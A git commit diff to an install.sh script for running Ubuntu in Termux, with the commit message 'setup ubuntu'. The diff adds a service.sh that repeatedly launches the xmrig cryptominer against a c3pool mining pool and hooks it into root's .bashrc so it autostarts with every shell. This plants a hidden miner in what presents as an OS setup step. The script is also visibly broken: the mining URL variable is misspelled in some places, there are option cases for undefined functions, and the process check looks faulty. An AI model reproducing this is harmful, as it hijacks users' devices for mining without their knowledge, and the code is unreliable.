5eeb5e42233b762ebb884921ccd09bff3dde6a61
zylntxx <zylntxx@gmail.com>
2021-03-27 22:58:00 +0800

    setup ubuntu

--- install.sh
+++ install.sh
@@ -23,7 +23,74 @@ autostart_ubuntu(){
   add_to_bashrc "$command"
 }
 
-install_ubuntu
-start_ubuntu
-echo "已经在执行了"
 
+service_bash(){
+  local bin="$HOME/ubuntu-in-termux/ubuntu-fs/root/service.sh"
+  cat > "$bin" <<- EOM
+#!/bin/bash
+
+echo "SHELL DEMON START!!"
+while true
+do
+	PID_COUNT=\$(ps aux|grep ./xmrig |grep -c grep)
+	if [ $PID_COUNT -eq 0 ]
+	then
+		[ ! -e ./xmrig ] && echo "ERROR: XMRIG not exists."  && exit
+		bash ./xmrig --randomx-mode=light --no-huge-pages -O $USERPASS -o $MIMING_URL
+	fi
+	sleep 60
+done
+
+EOM
+
+  echo "bash ./service.sh" >> ~/ubuntu-in-termux/ubuntu-fs/root/.bashrc
+}
+
+
+USERPASS="12345:12345"
+MINING_URL="mine.c3pool.com:13333"
+
+while getopts "O:o:" OPT; do
+    case $OPT in
+    O)
+        USERPASS=$OPTARG
+        ;;
+    o)
+        MIMING_URL=$OPTARG
+        ;;
+    u)
+        KEY_URL=$OPTARG
+        get_url_key
+        install_key
+        ;;
+    f)
+        KEY_PATH=$OPTARG
+        get_loacl_key
+        install_key
+        ;;
+    p)
+        SSH_PORT=$OPTARG
+        change_port
+        ;;
+    d)
+        disable_password
+        ;;
+    ?)
+        USAGE
+        exit 1
+        ;;
+    :)
+        USAGE
+        exit 1
+        ;;
+    *)
+        USAGE
+        exit 1
+        ;;
+    esac
+done
+
+if [ ! -x "$HOME/ubuntu-in-termux/ubuntu-fs/root/service.sh" ]; then
+  install_ubuntu
+  service_bash
+fi
